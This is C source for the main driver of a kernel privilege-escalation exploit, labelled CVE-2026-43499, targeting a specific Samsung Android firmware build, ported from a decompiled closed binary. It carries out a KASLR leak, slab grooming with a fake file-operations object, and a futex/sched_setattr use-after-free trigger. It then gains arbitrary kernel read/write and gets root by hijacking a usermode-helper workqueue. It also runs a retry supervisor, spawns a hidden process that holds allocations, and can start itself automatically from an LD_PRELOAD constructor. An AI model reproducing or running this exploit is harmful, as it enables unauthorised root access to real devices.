/*
 * Clean-room port of cve-2026-43499-app-afzh3.so's entry point.
 *
 * Every function below carries a `source:` comment naming the address in
 * the closed .so it was decompiled from (Ghidra headless, this session).
 * Embedded constants were read directly out of the binary's .rodata via
 * `python3 -c "open(...).read()[addr:addr+N]"`, not invented.
 *
 * The current flow wires the supervisor, KASLR leak, reclaim grooming,
 * futex/FPSIMD trigger, ashmem AAR/AAW verification, and root UMH install.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "aar_aaw.h"
#include "futex_trigger.h"
#include "groom.h"
#include "kaslr.h"
#include "pipe_physrw.h"
#include "root_umh.h"
#include "slabinfo.h"

/* source: FUN_0010a9d8 -- getenv + strtol clamped to [min,max], falling
 * back to `fallback` on any parse error or out-of-range value. */
static int env_int_clamped(const char *name, int fallback, int min,
                            int max) {
  const char *raw = getenv(name);
  if (!raw || !*raw) {
    return fallback;
  }
  errno = 0;
  char *end = NULL;
  long value = strtol(raw, &end, 0);
  if (errno != 0 || end == raw || *end != '\0' || value < min ||
      value > max) {
    return fallback;
  }
  return (int)value;
}

/* source: FUN_0010aaa4 */
static int setenv_str(const char *name, const char *value) {
  return setenv(name, value, 1);
}

/* source: FUN_001048f8 + FUN_00104934 -- prints the closed binary's fixed
 * failure banner (bytes read at file offset 0x2155) and exits(-1). We keep
 * the same user-visible message since it is just a string, not logic. */
static void fatal_usage(void) {
  fwrite("\x1b[31m[!] \x1b[0moperation failed\n", 1, 33, stderr);
  exit(-1);
}

/* source: literal 8-entry int32 table at file offset 0x243c in
 * cve-2026-43499-app-afzh3.so, read with:
 *   python3 -c "import struct; d=open('...','rb').read();
 *     print(struct.unpack_from('<8i', d, 0x243c))"
 * -> (5000, 0, 10000, 30000, -5000, 20000, 15000, 25000)
 * Added to the base PSELECT_DELAY_USEC per attempt, indexed by
 * (attempt - 1) % 8. Same role as our own route_delay_usec() in fops.c,
 * just a different table. */
static const int32_t kAttemptDelayOffsetsUsec[8] = {
  5000, 0, 10000, 30000, -5000, 20000, 15000, 25000,
};

enum attempt_kernel_state {
  ATTEMPT_PRE_MUTATION = 0,
  ATTEMPT_MUTATION_PENDING = 1,
  ATTEMPT_KERNEL_MUTATED = 2,
  ATTEMPT_FOPS_RESTORED = 3,
  ATTEMPT_PIPE_READY = 4,
  ATTEMPT_WORKQUEUE_MUTATED = 5,
  ATTEMPT_ROOT_READY = 6,
};

/* source: shared struct written by DAT_0010ea78 = mmap(NULL, 0x20,
 * PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0); 0x20 bytes.
 * Field layout inferred from the 32-bit/64-bit index arithmetic in the
 * decompile (DAT_0010ea78[1] as a 32-bit ready flag, then three 64-bit
 * fields at word indices 2/4/6) -- this is the child->parent P0 handoff. */
struct attempt_shared_state {
  int32_t status;              /* offset 0x00: enum attempt_kernel_state */
  int32_t dirty;                /* offset 0x04: P0 handoff published */
  uint64_t slide_p0_offset;     /* offset 0x08 */
  uint64_t p0_gate_page_struct; /* offset 0x10 */
  uint64_t p0_probe_page_struct;/* offset 0x18 */
};
_Static_assert(sizeof(struct attempt_shared_state) == 0x20,
               "attempt_shared_state must match the closed binary's mmap size");

static void pin_to_cpu(int cpu);
static void raise_rlimit_to_max(int resource);

/* source: FUN_001044f4 @ 0x47ec-0x48f0. The successful worker forks a
 * detached holder that inherits the reclaim sockets and keeps their pages
 * allocated after /system/bin/true exits. Use raw syscalls in the child: the
 * fork happens while the futex owner thread still exists. */
static pid_t spawn_allocation_keeper(void) {
  pid_t child = fork();
  if (child != 0) {
    return child;
  }

  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
  syscall(SYS_setsid);

  int null_fd = (int)syscall(SYS_openat, AT_FDCWD, "/dev/null",
                             O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (null_fd != fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  } else {
    syscall(SYS_close, STDIN_FILENO);
    syscall(SYS_close, STDOUT_FILENO);
    syscall(SYS_close, STDERR_FILENO);
  }

  const struct timespec hold = {.tv_sec = 86400, .tv_nsec = 0};
  for (;;) {
    syscall(SYS_nanosleep, &hold, NULL);
  }
}

/* source: test_root_immediate.c's post_trigger() -- verify AAR/AAW then
 * install root_umh, called from run_futex_trigger_cb()'s callback (same
 * thread, immediately after sched_setattr, before run_futex_trigger_cb
 * returns). */
struct do_one_attempt_ctx {
  uint64_t kernel_base;
  uint64_t payload_base;
  const char *root_umh_path;
  struct attempt_shared_state *shared;
};

static int do_one_attempt_post_trigger(void *ctx_v) {
  struct do_one_attempt_ctx *ctx = (struct do_one_attempt_ctx *)ctx_v;
  uint64_t ashmem_misc_fops_addr = ctx->kernel_base + 0x02bfcf28ULL;
  futex_v14_dbg("callback-entry"); /* H0: time from handshake entry to callback */

  /* This callback is gated on a successful sched_setattr. From this point the
   * kernel may reference the reclaimed object even when open/readback fails.
   * Mark the attempt unsafe before any syscall so the supervisor never retries
   * in the same boot and the allocation keeper is spawned on every exit path. */
  __atomic_store_n(&ctx->shared->status, ATTEMPT_KERNEL_MUTATED,
                   __ATOMIC_RELEASE);

  puts("\x1b[33m[*] \x1b[0mstage=verifying-kernel-access");
  int fd = oss_open_kernel_rw();
  if (fd < 0) {
    /* The node was opened successfully during preflight. Losing it after
     * sched_setattr can mean the global fops pointer changed. Retrying after
     * that would free the reclaimed page while the kernel may still use it. */
    fprintf(stderr, "[immediate] open resolved ashmem node failed\n");
    return 0;
  }
  int verified = oss_verify_kernel_access_ex(
      fd, ashmem_misc_fops_addr, ctx->payload_base, NULL);
  fprintf(stderr, "[immediate] verify (called immediately, same thread) = %d\n",
          verified);
  if (!verified) {
    close(fd);
    return 0;
  }

  /* FUN_001076c0 restores ashmem_misc.fops to the real static table after
   * proving configfs AAR/AAW, while the already-open fd retains fake f_op and
   * remains usable for the root stage. This removes the global dangling
   * pointer before the sprayed page can ever be released. */
  uint64_t real_ashmem_fops = ctx->kernel_base + 0x0200d4b8ULL;
  uint64_t restored_fops = 0;
  int restore_ok = oss_kernel_write(fd, ashmem_misc_fops_addr,
                                    &real_ashmem_fops,
                                    sizeof(real_ashmem_fops)) &&
                   oss_kernel_read(fd, ashmem_misc_fops_addr, &restored_fops,
                                   sizeof(restored_fops)) &&
                   restored_fops == real_ashmem_fops;
  fprintf(stderr,
          "[immediate] restore ashmem_misc.fops got=%016llx want=%016llx ok=%d\n",
          (unsigned long long)restored_fops,
          (unsigned long long)real_ashmem_fops, restore_ok);
  if (!restore_ok) {
    close(fd);
    return 0;
  }
  __atomic_store_n(&ctx->shared->status, ATTEMPT_FOPS_RESTORED,
                   __ATOMIC_RELEASE);

  puts("\x1b[33m[*] \x1b[0mstage=starting-temporary-root");
  if (!oss_pipe_rw_install(fd, ctx->kernel_base, ctx->payload_base)) {
    fprintf(stderr, "[immediate] pipe physical R/W install failed\n");
    close(fd);
    return 0;
  }
  __atomic_store_n(&ctx->shared->status, ATTEMPT_PIPE_READY,
                   __ATOMIC_RELEASE);

  /* root_umh uses configfs only for SELinux and the static workqueue slot;
   * dynamic slab state uses pipe R/W. Owner cleanup below follows FUN076c0. */
  int rooted = root_umh_install_fd_tracked(
      fd, ctx->kernel_base, ctx->payload_base, ctx->root_umh_path,
      &ctx->shared->status, ATTEMPT_WORKQUEUE_MUTATED);
  uint64_t null_owner = 0;
  int owner_cleared = oss_kernel_write(fd, ctx->payload_base | 0x1180ULL,
                                       &null_owner, sizeof(null_owner));
  fprintf(stderr, "[immediate] fake fops owner clear=%d\n", owner_cleared);
  close(fd);
  rooted = rooted && owner_cleared;
  if (rooted) {
    __atomic_store_n(&ctx->shared->status, ATTEMPT_ROOT_READY,
                     __ATOMIC_RELEASE);
    puts("\x1b[32m[+] \x1b[0mstage=temporary-root-ready");
  }
  return rooted;
}

/* source: FUN_001044f4 -- one complete exploit attempt. */
static int do_one_attempt(struct attempt_shared_state *shared,
                           int pselect_delay_usec) {
  (void)pselect_delay_usec;
  puts("\x1b[33m[*] \x1b[0mstage=preparing-kernel-access");

  raise_rlimit_to_max(RLIMIT_NOFILE);
  raise_rlimit_to_max(RLIMIT_NPROC);

  /* FUN_001044f4 calls FUN_001057e0 before KASLR and grooming. Do not
   * trigger the corruption unless its later FUN_00105968 open can succeed. */
  if (!oss_prepare_kernel_rw_path()) {
    fprintf(stderr, "[aar_aaw] no openable ashmem node before exploit\n");
    return 0;
  }
  pin_to_cpu(0);

  /* source: FUN_001044f4 -- puts("stage=locating-kernel"); FUN_0010757c(). */
  puts("\x1b[33m[*] \x1b[0mstage=locating-kernel");
  uint64_t kernel_base = 0;
  uint64_t p0_offset = 0;
  /* source: FUN_0010757c. A forced P0 offset does not skip tracefs: the
   * closed binary still prefers its canonical tracefs result and uses the
   * 64-KiB-aligned offset only as fallback. */
  const char *forced_offset = getenv("SLIDE_P0_OFFSET");
  int has_forced_offset = forced_offset && *forced_offset;
  if (has_forced_offset) {
    errno = 0;
    char *end = NULL;
    p0_offset = strtoull(forced_offset, &end, 0);
    if (errno || end == forced_offset || *end != '\0' ||
        p0_offset > 0x1f8000ULL || (p0_offset & 0x7fffULL) != 0) {
      fprintf(stderr, "[kaslr] invalid SLIDE_P0_OFFSET\n");
      return 0;
    }
  }
  if (!kaslr_locate_via_tracefs(&kernel_base)) {
    if (!has_forced_offset) {
      return 0;
    }
    kernel_base = 0xffffffc008000000ULL + p0_offset;
    fprintf(stderr,
            "[kaslr] source=forced-p0 base=%016llx p0_offset=%016llx\n",
            (unsigned long long)kernel_base,
            (unsigned long long)p0_offset);
  }
  puts("\x1b[33m[*] \x1b[0mstage=kernel-location-ready");
  __atomic_store_n(&shared->p0_gate_page_struct, 0, __ATOMIC_RELEASE);
  __atomic_store_n(&shared->p0_probe_page_struct, 0, __ATOMIC_RELEASE);
  __atomic_store_n(&shared->slide_p0_offset, p0_offset, __ATOMIC_RELEASE);
  __atomic_store_n(&shared->dirty, 1, __ATOMIC_RELEASE);

  /* source: FUN_001044f4 -- explicit KASLR-only diagnostic mode. */
  if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
    fprintf(stderr,
            "[mode] SLIDE_ONLY/P0_ONLY set: stopping after KASLR "
            "locate, as designed\n");
    return 1;
  }

  /* source: FUN_00106288 opens with a diagnostic FUN_00106ec0() call
   * (/proc/slabinfo "mm_struct" line) before ever forking/spraying.
   * Ported faithfully as read_mm_slabinfo() (src/slabinfo.c). Read-only,
   * safe. */
  struct mm_slabinfo before;
  if (read_mm_slabinfo(&before)) {
    fprintf(stderr,
            "[kaslr] mm_struct slabinfo active=%lu num=%lu objsize=%lu "
            "objperslab=%lu active_slabs=%lu num_slabs=%lu\n",
            before.active_objs, before.num_objs, before.objsize,
            before.objperslab, before.active_slabs, before.num_slabs);
  } else {
    fprintf(stderr, "[kaslr] /proc/slabinfo mm_struct line not found\n");
  }

  /* source: target.h for dm3q-S918BXXSAFZH3 (already verified against
   * this device's live /proc/kallsyms this session). Real kernel
   * addresses, computed from the KASLR base tracefs just leaked. */
  uint64_t init_task_addr = kernel_base + 0x02c05080ULL;
  uint64_t ashmem_misc_fops_addr = kernel_base + 0x02bfcf28ULL;

  /* source: FUN_00106288 in full -- groom.c ports the exact-match
   * fork/kill/leak/drain/spray choreography (see groom.h) and writes
   * build_fops_install_object()'s corrected fields into the reclaimed
   * page. Still no real trigger fired: the kernel now merely *contains*
   * our bytes at payload_base, nothing has read task->pi_blocked_on
   * into it yet. */
  /* FUN_00107dd4 is a separate later primitive in the closed binary. It
   * does not wrap FUN_00106288 and its 480 pipes must not perturb this
   * fake-fops reclaim window. */
  uint64_t payload_base = groom_and_install_fops_object(
      kernel_base, ashmem_misc_fops_addr, init_task_addr);
  if (!payload_base) {
    fprintf(stderr, "[groom] failed before reaching the reclaim step\n");
    return 0;
  }
  fprintf(stderr,
          "[groom] installed fops object at payload_base=%016llx "
          "target(ashmem_misc_fops)=%016llx init_task=%016llx\n",
          (unsigned long long)payload_base,
          (unsigned long long)ashmem_misc_fops_addr,
          (unsigned long long)init_task_addr);

  /* source: FUN_00103e18 (waiter) + FUN_00104274 (owner) + FUN_00104300
   * (consumer/sched_setattr trigger). See futex_trigger.c for the
   * triple-verified derivation. This is the first real kernel-touching
   * trigger in this clean-room engine -- everything before this point
   * (tracefs, kernelsnitch leak, groom+spray) is read-only or userspace
   * reclaim only. */
  /* source: root_umh.h -- same call_usermodehelper_exec_work workqueue
   * hijack the closed binary's FUN_00108fa4 performs, reused as-is
   * (see root_umh.h header comment). root_umh_path is this project's
   * own prebuilt UMH helper (build/dm3q-S918BXXSAFZH3/
   * cve-2026-43499-root), staged on-device and passed the same way the
   * real app passes CVE43499_ROOT_HELPER. */
  const char *root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!root_umh_path || root_umh_path[0] != '/') {
    fprintf(stderr, "[root_umh] missing CVE43499_ROOT_HELPER\n");
    return 0;
  }

  /* source: run_futex_trigger_v11_{cb,full} (futex_trigger.h/.c) --
   * supersedes v10 in this wiring. v10's own comment claimed the real
   * verify-call gate (G+0x760) "never opens... never written to a
   * nonzero value anywhere r2 can resolve statically", and so called
   * the callback unconditionally from the main thread after the whole
   * routine joined, instead of from inside the waiter thread the way
   * the real binary does. Re-disassembling the consumer
   * (fcn.00004300, raw vaddr 0x4494-0x44ac) directly with `pd` (not
   * `axt`/xref search) found the actual write: `bl 0x3650`, and 0x3650
   * is `__aarch64_atomic_fetch_add4_relax` (`ldaddal w0,w0,[x1]` at raw
   * vaddr 0x3660) -- an LSE atomic increment, which a plain "find a
   * str writing a nonzero constant" search will never surface. The
   * gate genuinely opens on every successful sched_setattr. v11 =
   * v10's waiter body (no SIGUSR2/delay to owner, yield-spin instead
   * of usleep -- both already correct) with the callback moved back
   * into the waiter thread, gated on g_sched_setattr_ok, matching the
   * real fcn.000076c0 call site (raw vaddr 0x4150) exactly. */
  /* BISECT_VARIANT is a project-only diagnostic switch. The default v14
   * now carries the closed -1 -> gate -> SIGUSR1 -> 1 -> sched_setattr
   * handshake and keeps the post-sigreturn window free of libc/syscalls. */
  struct do_one_attempt_ctx ctx = {
      kernel_base, payload_base, root_umh_path, shared};
  const char *bisect = getenv("BISECT_VARIANT");
  int triggered;
  if (bisect && strcmp(bisect, "13") == 0) {
    fprintf(stderr, "[futex] BISECT_VARIANT=13 blocked: no pre-mutation state\n");
    return 0;
  } else if (bisect && strcmp(bisect, "14") == 0) {
    triggered = run_futex_trigger_v14_full_staged(
        payload_base, ashmem_misc_fops_addr, &shared->status,
        ATTEMPT_MUTATION_PENDING, ATTEMPT_KERNEL_MUTATED,
        do_one_attempt_post_trigger, &ctx);
  } else {
    triggered = run_futex_trigger_v14_full_staged(
        payload_base, ashmem_misc_fops_addr, &shared->status,
        ATTEMPT_MUTATION_PENDING, ATTEMPT_KERNEL_MUTATED,
        do_one_attempt_post_trigger, &ctx);
  }
  fprintf(stderr, "[futex] trigger result=%d\n", triggered);
  if (triggered ||
      __atomic_load_n(&shared->status, __ATOMIC_ACQUIRE) != 0) {
    pid_t keeper = spawn_allocation_keeper();
    if (keeper < 0) {
      fprintf(stderr, "[holder] fork failed errno=%d\n", errno);
      return 0;
    }
    fprintf(stderr, "[holder] pid=%d name=cve43499-hold\n", keeper);
  }
  return triggered;
}

/* source: _INIT_2 @ 0x10a440 (the real ELF entry point of the closed
 * .so, run automatically from .init_array at dlopen() time -- it has
 * zero exported symbols, so it cannot be dlsym()'d, only auto-run).
 * app_main() also has a normal executable wrapper for diagnostics; the
 * production shared object invokes it from its constructor. */
/* source: FUN_000041f0(0) -- sched_setaffinity(0, 0x80, &(1<<0)), the
 * very first call fcn.000044f4 (this project's app_main() equivalent)
 * makes, before even the rlimit adjustments. Same helper shape as
 * futex_trigger.c's pin_to_cpu(3) for the waiter thread (raw disasm
 * confirmed both this session, not duplicated code by accident --
 * kept as a small standalone copy here rather than sharing a header,
 * since it's a two-line wrapper and this file doesn't otherwise depend
 * on futex_trigger.c's internals). */
static void pin_to_cpu(int cpu) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(cpu, &set);
  sched_setaffinity(0, sizeof(set), &set);
}

/* source: fcn.000044f4, raw vaddr 0x4520-0x4570 (raw disasm, `asm.varsub`
 * disabled to avoid a misleading stack-slot name collision with this
 * function's own canary variable -- verified twice this session because
 * of that). Confirmed pattern (not a guess): for both RLIMIT_NOFILE=7
 * and RLIMIT_NPROC=6, `getrlimit(res, &rl); rl.rlim_cur =
 * rl.rlim_max; setrlimit(res, &rl);` -- i.e. raise the soft limit to
 * the hard limit for both resources, treating any getrlimit/setrlimit
 * failure as fatal (matches the closed binary's own `fatal_usage()`-
 * equivalent call at each failure branch). Directly relevant to this
 * project's own documented history: groom.c forks and holds open
 * memfds for up to ~1279 children in one attempt, and this session
 * separately root-caused an earlier "F_SETPIPE_SZ Operation not
 * permitted" failure in the OLD engine to exactly this kind of
 * per-UID fd/pipe-page budget exhaustion. Raising RLIMIT_NOFILE before
 * that spray starts is a direct, safe mitigation for the same class of
 * problem, not a speculative addition. */
static void raise_rlimit_to_max(int resource) {
  struct rlimit rl;
  if (getrlimit(resource, &rl) == -1) {
    fatal_usage();
  }
  rl.rlim_cur = rl.rlim_max;
  if (setrlimit(resource, &rl) == -1) {
    fatal_usage();
  }
}

static int app_main(void) {
  /* source: _INIT_2 sets all standard streams to _IONBF before its first
   * stage message; child attempts end with _exit(), so buffering here would
   * otherwise discard the success marker consumed by simple-root. */
  if (setvbuf(stdin, NULL, _IONBF, 0) == -1 ||
      setvbuf(stdout, NULL, _IONBF, 0) == -1 ||
      setvbuf(stderr, NULL, _IONBF, 0) == -1) {
    fatal_usage();
  }

  /* source: clock_gettime(CLOCK_BOOTTIME=7, ...); if tv_sec < 0x78 (120),
   * sleep the remainder. Identical in spirit to our own "waiting for boot
   * allocator quiet window" in src/preload.c; the closed binary's version
   * loops on sleep()'s return value to handle EINTR, so we do too. */
  /* The closed binary's fixed 120 is now the default of BOOT_QUIET_SEC, which
   * the stability launcher sets to 0 to skip this wait once its own gates have
   * already proven the device quiet. Range [0,300]; 0 disables the wait. */
  int boot_quiet_sec = env_int_clamped("BOOT_QUIET_SEC", 120, 0, 300);
  struct timespec boot_now;
  if (clock_gettime(CLOCK_BOOTTIME, &boot_now) == -1) {
    fatal_usage();
  }
  if (boot_quiet_sec > 0 && boot_now.tv_sec < boot_quiet_sec) {
    unsigned int remaining = (unsigned int)(boot_quiet_sec - boot_now.tv_sec);
    printf("\x1b[33m[*] \x1b[0mwaiting for boot allocator quiet window "
           "seconds=%u\n",
           remaining);
    do {
      remaining = sleep(remaining);
    } while (remaining != 0);
  } else {
    printf("\x1b[33m[*] \x1b[0mboot allocator quiet window skipped "
           "BOOT_QUIET_SEC=%d boottime=%llds\n",
           boot_quiet_sec, (long long)boot_now.tv_sec);
  }

  int attempts = env_int_clamped("EXPLOIT_ATTEMPTS", 8, 1, 0x40);
  int pselect_delay_usec =
      env_int_clamped("PSELECT_DELAY_USEC", 20000, 0, 1000000);
  int attempt_timeout_sec =
      env_int_clamped("EXPLOIT_ATTEMPT_TIMEOUT_SEC", 90, 5, 900);
  int p0_timeout_sec = env_int_clamped(
      "P0_ATTEMPT_TIMEOUT_SEC", 20, 5, attempt_timeout_sec);
  if (p0_timeout_sec > attempt_timeout_sec) {
    p0_timeout_sec = attempt_timeout_sec;
  }
  if (getenv("SLIDE_ONLY")) {
    attempts = 1;
  }

  struct attempt_shared_state *shared = mmap(
      NULL, sizeof(*shared), PROT_READ | PROT_WRITE,
      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (shared == MAP_FAILED) {
    fatal_usage();
  }
  memset(shared, 0, sizeof(*shared));

  unsetenv("LD_PRELOAD");

  printf("\x1b[33m[*] \x1b[0mstarting exploit attempts=%d\n", attempts);

  int success = 0;
  for (int attempt = 1; attempt <= attempts; attempt++) {
    printf("\x1b[33m[*] \x1b[0mexploit attempt=%d/%d\n", attempt, attempts);

    pid_t child = fork();
    if (child == 0) {
      if (prctl(PR_SET_PDEATHSIG, SIGKILL) == -1) {
        fatal_usage();
      }
      if (getppid() == 1) {
        _exit(1);
      }
      int delay = pselect_delay_usec +
                  kAttemptDelayOffsetsUsec[(attempt - 1) % 8];
      if (delay < 0) {
        delay = 0;
      }
      char delay_arg[16];
      snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
      if (setenv_str("PSELECT_DELAY_USEC", delay_arg) == -1) {
        fatal_usage();
      }
      char attempt_arg[16];
      snprintf(attempt_arg, sizeof(attempt_arg), "%d", attempt);
      if (setenv_str("S23_SUPERVISOR_ATTEMPT", attempt_arg) == -1) {
        fatal_usage();
      }
      int ok = do_one_attempt(shared, delay);
      _exit(ok ? 0 : 1);
    }
    if (child == -1) {
      fatal_usage();
    }

    struct timespec started;
    if (clock_gettime(CLOCK_MONOTONIC, &started) == -1) {
      fatal_usage();
    }
    int status = 0;
    pid_t waited;
    int mutation_timeout_reported = 0;
    int mutation_pending_reported = 0;
    for (;;) {
      waited = waitpid(child, &status, WNOHANG);
      if (waited == child) {
        break;
      }
      if (waited == -1 && errno != EINTR) {
        fatal_usage();
      }
      struct timespec now;
      if (clock_gettime(CLOCK_MONOTONIC, &now) == -1) {
        fatal_usage();
      }
      long elapsed_sec = now.tv_sec - started.tv_sec;
      int observed_kernel_state =
          __atomic_load_n(&shared->status, __ATOMIC_ACQUIRE);
      if (observed_kernel_state >= ATTEMPT_MUTATION_PENDING &&
          !mutation_pending_reported) {
        fprintf(stderr, "stage=kernel-mutation-pending state=%d\n",
                observed_kernel_state);
        mutation_pending_reported = 1;
      }
      int budget =
          (getenv("SLIDE_P0_OFFSET") ||
           __atomic_load_n(&shared->dirty, __ATOMIC_ACQUIRE))
              ? attempt_timeout_sec
              : p0_timeout_sec;
      if (elapsed_sec >= budget) {
        int kernel_state =
            __atomic_load_n(&shared->status, __ATOMIC_ACQUIRE);
        if (kernel_state != ATTEMPT_PRE_MUTATION) {
          if (!mutation_timeout_reported) {
            fprintf(stderr,
                    "[supervisor] timeout after kernel mutation state=%d; "
                    "preserving child and holders until natural completion\n",
                    kernel_state);
            mutation_timeout_reported = 1;
          }
          usleep(100000);
          continue;
        }
        if (kill(child, SIGKILL) == -1) {
          fatal_usage();
        }
        do {
          waited = waitpid(child, &status, 0);
        } while (waited == -1 && errno == EINTR);
        if (waited == -1) {
          fatal_usage();
        }
        break;
      }
      usleep(100000);
    }

    if (waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
      printf("\x1b[32m[+] \x1b[0mexploit completed attempt=%d/%d\n",
             attempt, attempts);
      success = 1;
      break;
    }

    if (__atomic_load_n(&shared->status, __ATOMIC_ACQUIRE)) {
      fprintf(stderr,
              "stage=kernel-mutation-pending state=%d\n"
              "[supervisor] kernel mutation reached; refusing unsafe retry "
              "before reboot\n",
              __atomic_load_n(&shared->status, __ATOMIC_ACQUIRE));
      break;
    }

    if (!getenv("SLIDE_P0_OFFSET") &&
        __atomic_load_n(&shared->dirty, __ATOMIC_ACQUIRE)) {
      uint64_t slide_p0_offset = __atomic_load_n(
          &shared->slide_p0_offset, __ATOMIC_ACQUIRE);
      uint64_t gate_page_struct = __atomic_load_n(
          &shared->p0_gate_page_struct, __ATOMIC_ACQUIRE);
      uint64_t probe_page_struct = __atomic_load_n(
          &shared->p0_probe_page_struct, __ATOMIC_ACQUIRE);
      char offset_arg[16];
      char gate_arg[24];
      char probe_arg[24];
      snprintf(offset_arg, sizeof(offset_arg), "0x%llx",
               (unsigned long long)slide_p0_offset);
      snprintf(gate_arg, sizeof(gate_arg), "0x%llx",
               (unsigned long long)gate_page_struct);
      snprintf(probe_arg, sizeof(probe_arg), "0x%llx",
               (unsigned long long)probe_page_struct);
      if (setenv_str("SLIDE_P0_OFFSET", offset_arg) == -1 ||
          setenv_str("P0_GATE_PAGE_STRUCT", gate_arg) == -1 ||
          setenv_str("P0_PROBE_PAGE_STRUCT", probe_arg) == -1) {
        fatal_usage();
      }
    }

    if (attempt < attempts) {
      sleep(5);
    }
  }

  munmap(shared, sizeof(*shared));
  return success ? 0 : -1;
}

#if defined(BUILD_LD_PRELOAD) && BUILD_LD_PRELOAD
/* source: _INIT_2 @ 0x10a440 -- real closed .so has zero exported
 * symbols and runs app_main()-equivalent from .init_array at dlopen()
 * time. This mirrors that: LD_PRELOAD=this.so exec /system/bin/true
 * runs load() before true's own main(), exactly like
 * ../src/preload.c:load() does for the production payload. */
__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;
  int status = app_main();
  if (status != 0) {
    exit(status);
  }
}
#else
int main(void) {
  return app_main();
}
#endif
